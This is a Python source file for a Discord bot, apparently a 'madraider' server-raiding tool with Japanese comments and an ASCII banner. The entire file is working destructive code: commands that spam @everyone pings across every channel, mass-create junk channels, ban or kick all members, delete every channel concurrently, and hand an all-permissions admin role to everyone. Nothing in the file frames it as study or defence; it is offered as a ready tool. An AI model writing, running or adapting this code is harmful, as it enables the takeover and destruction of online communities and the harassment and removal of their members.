import discord
from discord import Intents
from discord.ext import commands
import asyncio
import json
import os
from colorama import init, Fore, Back, Style
init()

def gradient_text(text, start_color, end_color):
    result = ""
    length = len(text)
    for i, char in enumerate(text):
        red = int(start_color[0] + (end_color[0] - start_color[0]) * (i / length))
        green = int(start_color[1] + (end_color[1] - start_color[1]) * (i / length))
        blue = int(start_color[2] + (end_color[2] - start_color[2]) * (i / length))
        result += f"\033[38;2;{red};{green};{blue}m{char}"
    return result + Style.RESET_ALL

start_color = (255, 0, 0)  # 赤
end_color = (0, 0, 255)  # 青

with open("cfg.json") as f:
    config = json.load(f)

text="""
███╗   ███╗ █████╗ ██████╗ ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
████╗ ████║██╔══██╗██╔══██╗████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██╔████╔██║███████║██║  ██║██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██║╚██╔╝██║██╔══██║██║  ██║██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║  ██║██████╔╝██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                         
                        prefix:"""+config["prefix"]

intents = Intents.all()

bot = commands.Bot(command_prefix=config["prefix"], intents=intents)

# 既存のhelpコマンドを削除
bot.remove_command("help")

def is_allowed_user(ctx):
    return ctx.author.id in config["userid"]

# The rest of the code remains the same
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=config["prefix"]+f"help"))
    os.system('cls' if os.name == 'nt' else 'clear')
    print(gradient_text(text, start_color, end_color))


@bot.command()
@commands.check(is_allowed_user)
async def help(ctx):
    embed = discord.Embed(title="Help", description="コマンド一覧 (prefix:"+config["prefix"]+")")
    embed.add_field(name="massping", value="massping {message} [number] [True/False]", inline=False)
    embed.add_field(name="masschannel", value="{number}", inline=False)
    embed.add_field(name="banall", value="(message)", inline=False)
    embed.add_field(name="kickall", value="(message)", inline=False)
    embed.add_field(name="delete_channels", value="delete channels, so fast", inline=False)
    embed.add_field(name="adminr", value="create adminrole and enable admin to everyone.", inline=False)
    await ctx.send(embed=embed)

@bot.command()
@commands.check(is_allowed_user)
async def massping(ctx, message, num=1, all_channels=False):
    tasks = []
    delay = 1  # 送信ディレイ（秒）

    async def send_with_delay(channel, message, delay):
        await asyncio.sleep(delay)
        await channel.send(message)

    if all_channels:
        channels = ctx.guild.text_channels
        for channel in channels:
            for i in range(num):
                tasks.append(asyncio.create_task(send_with_delay(channel, f"@everyone {message}", i * delay)))
    else:
        for i in range(num):
            tasks.append(asyncio.create_task(send_with_delay(ctx.channel, f"@everyone {message}", i * delay)))

    await asyncio.gather(*tasks)

@bot.command()
@commands.check(is_allowed_user)
async def masschannel(ctx, num=1):
    for _ in range(num):
        await ctx.guild.create_text_channel("madraider-on-top")

@bot.command()
@commands.check(is_allowed_user)
async def banall(ctx, banmessage: str=None):
    for member in ctx.guild.members:
        if member != ctx.author and member != ctx.guild.me:
            try:
                await ctx.guild.ban(member, reason=banmessage)
                print(f"Succeeded in banning the {member.name}")
            except discord.Forbidden:
                print(f"{member.name} ban failed: insufficient authority")

@bot.command()
@commands.check(is_allowed_user)
async def kickall(ctx, kickmessage: str=None):
    for member in ctx.guild.members:
        if member != ctx.author and member != ctx.guild.me:
            try:
                await ctx.guild.kick(member, reason=kickmessage)
                print(f"Succeeded in kicking {member.name}")
            except discord.Forbidden:
                print(f"{member.name} kick failed: insufficient authority")

@bot.command()
@commands.check(is_allowed_user)
async def delete_channels(ctx):
    # Get a list of all channels in the server
    channels = ctx.guild.channels
    
    # Define a coroutine to delete a channel
    async def delete_channel(channel):
        await channel.delete()
        
    # Create a list of tasks to delete each channel
    tasks = [asyncio.create_task(delete_channel(channel)) for channel in channels]
        
    # Run the tasks concurrently
    await asyncio.gather(*tasks)

@bot.command()
@commands.check(is_allowed_user)
async def adminr(ctx):
    # Create a role with all permissions enabled
    admin_role = await ctx.guild.create_role(name="AdminRole", permissions=discord.Permissions.all())

    # Assign the role to all members in the server
    for member in ctx.guild.members:
        await member.add_roles(admin_role)

    # Send a confirmation message
    await ctx.send(f"Everyone has been given the Admin {admin_role.name} role.")


bot.run(config["token"])
